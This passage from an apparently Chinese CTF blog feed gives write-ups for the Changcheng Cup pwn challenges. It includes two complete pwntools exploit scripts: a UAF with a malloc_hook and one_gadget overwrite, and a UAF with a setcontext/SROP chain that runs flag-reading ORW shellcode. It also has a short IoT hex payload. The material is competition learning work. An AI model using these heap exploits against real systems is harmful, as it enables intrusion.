register.</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guptf243r6j614a0man0p02.jpg" alt=""></p><p>But after testing, I found that hijacking the “r15” register seemed a bit difficult, so I changed my mind and hijacked it to where the interrupt is handled. According to the user manual, just pass in parameter “0x7f”.</p><p>payload: 6161616161616161616161616161616160447f</p><h2 id="Montevideo"><a href="#Montevideo" class="headerlink" title="Montevideo"></a>Montevideo</h2><p>(To be continued.)</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯wp</title>
      <link href="2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
      <url>2021/09/19/%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/09/20/eIGMuxfXNhL9qcv.png" alt=""></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>unhex然后base64 decode</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>签到UAF题，libc-2.23.so下的利用，还有个off by one和后门，uaf就够了，后门也不知道怎么用 (赛后听师傅说爆破1/256 ???）<br>uaf打io泄露地址，realloc调栈帧，one_gadget一把梭，之前没调过，调了很久QAQ，太菜了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_backdoor = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_backdoor))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            <span class="keyword">if</span> libc_path_local:</span><br><span class="line">                io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">                libc = ELF(libc_path_local)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = process(challenge)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;47.104.175.110&quot;</span>, <span class="number">20066</span>)</span><br><span class="line">            <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">                libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line">        printf = backdoor()</span><br><span class="line">        echo(<span class="string">&#x27;PRINTF:&#x27;</span> + <span class="built_in">hex</span>(printf))</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x90</span>)</span><br><span class="line">        add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">&#x27;\xe0\n&#x27;</span>)</span><br><span class="line">        edit(<span class="number">4</span>, <span class="string">&#x27;\xdd\x65\n&#x27;</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">        payload = <span class="number">3</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(<span class="number">0xfbad1800</span>)</span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00\n&#x27;</span></span><br><span class="line">        edit(<span class="number">5</span>, payload)</span><br><span class="line">        leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">192</span></span><br><span class="line">        echo(<span class="string">&#x27;LEAK:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">        libc_address = leak - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">        echo(<span class="string">&#x27;LIBC:&#x27;</span> + <span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line">        __malloc_hook = libc_address + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        ogList = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">        oglocal = [<span class="number">0x3f43a</span>]</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>, p64(__malloc_hook - <span class="number">0x23</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">        og = libc_address + ogList[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># og = libc_address + oglocal[0]</span></span><br><span class="line">        <span class="comment"># realloc_hook = libc_address + libc.sym[&#x27;__realloc_hook&#x27;]</span></span><br><span class="line">        realloc = libc_address + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        payload = (<span class="number">0x13</span> - <span class="number">0x8</span>) * <span class="string">&#x27;a&#x27;</span> + p64(og) + p64(realloc + <span class="number">0xb</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        edit(<span class="number">7</span>, payload)</span><br><span class="line"></span><br><span class="line">        raw_input()</span><br><span class="line">        add(<span class="number">8</span>, <span class="number">64</span>)</span><br><span class="line">        <span class="comment"># gdba()</span></span><br><span class="line">        ia()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>漏洞是uaf，libc 版本是2.27-3ubuntu1.4，跟libc2.31机制差不多，有key，但是不用管，直接edit完事<br>有show功能，但是只能申请0x10-0x60大小的堆块，而且开了沙箱，堆部结构很乱，先是一顿整理堆结构然后一通overlap构造一个unsorted bin出来leak地址<br>由于开了沙箱，考虑__free_hook改为setcontext+53控制寄存器<br>setcontext所用的payload太长，0x60大小的chunk写不进去，就用了两块0x60大小的chunk和一块0x50大小的chunk来写，由于之前伪造了ub，如果不清空在后续malloc和free的时候可能会报各种错误，所以先清空一些必要的非法chunk，然后由于payload不能断，但是header会阻断payload，所以又是一顿overlap伪造出来三个假的chunk来覆盖header<br>然后就是orw shellcode一把梭<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> six <span class="keyword">import</span> indexbytes</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc-2.27.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;47.104.175.110&quot;</span>, <span class="number">61608</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;input size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;input context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;input index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>():</span></span><br><span class="line">    edit(<span class="number">11</span>, <span class="number">0x60</span> * <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">12</span>, <span class="number">0x50</span> * <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>, <span class="number">0x60</span> * <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        add(i, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    fake = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)   <span class="comment"># Forge a fake header.</span></span><br><span class="line">    edit(<span class="number">0</span>, fake)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:])</span><br><span class="line">    fake_chunk = heap + <span class="number">0xf70</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    echo(<span class="string">&#x27;FAKE_CHUNK:&#x27;</span> + <span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">    edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, p64(fake_chunk) + p64(heap))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">11</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))      <span class="comment"># fake ub</span></span><br><span class="line">    edit(<span class="number">10</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))  </span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">    echo(<span class="string">&#x27;LEAK:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc_base = leak - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    setcontext_door = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    syscall = libc_base + libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">    echo(<span class="string">&#x27;SYSCALL:&#x27;</span> + <span class="built_in">hex</span>(syscall))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#=========================setcontext===========================</span></span><br><span class="line"></span><br><span class="line">    fake_rsp = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span></span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = fake_rsp</span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = fake_rsp</span><br><span class="line">    frame.rip = syscall</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(frame))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">12</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    edit(<span class="number">12</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    fake_chunk = heap + <span class="number">0x1020</span></span><br><span class="line">    edit(<span class="number">12</span>, p64(fake_chunk) + p64(heap))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="number">0x60</span>)   <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3b0</span> / <span class="number">0x30</span> + <span class="number">1</span>):</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment"># fake chunk: 13 11 12</span></span><br><span class="line">    echo(<span class="string">&#x27;HACX SIG:&#x27;</span> + <span class="built_in">hex</span>(heap + <span class="number">0xf50</span>))</span><br><span class="line">    paylaod = <span class="built_in">str</span>(frame)</span><br><span class="line">    edit(<span class="number">11</span>, paylaod[<span class="number">0</span>:<span class="number">0x60</span>])</span><br><span class="line">    edit(<span class="number">12</span>, paylaod[<span class="number">0x60</span>:<span class="number">0x60</span> + <span class="number">0x50</span>])</span><br><span class="line">    edit(<span class="number">13</span>, paylaod[<span class="number">0x60</span> + <span class="number">0x50</span>:].ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># poc()</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(<span class="number">0</span>) * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(free_hook) + p64(heap))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">14</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">14</span>, p64(setcontext_door))   <span class="comment"># __free_hook</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    layout = [</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">    free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line">    <span class="number">0x2000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: jmp rsp;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub rsp, 0x800</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    cmp eax, 0</span></span><br><span class="line"><span class="string">    js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    failed:</span></span><br><span class="line"><span class="string">    push 0x6c696166</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 4</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    exit:</span></span><br><span class="line"><span class="string">    xor edi, edi</span></span><br><span class="line"><span class="string">    mov eax, 231</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    sl(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></p><p>太菜了，要好好学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
            <tag> sandbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过angr-ctf学习angr符号执行</title>
      <link href="2021/09/10/angr-ctf/"/>
      <url>2021/09/10/angr-ctf/</url>
      
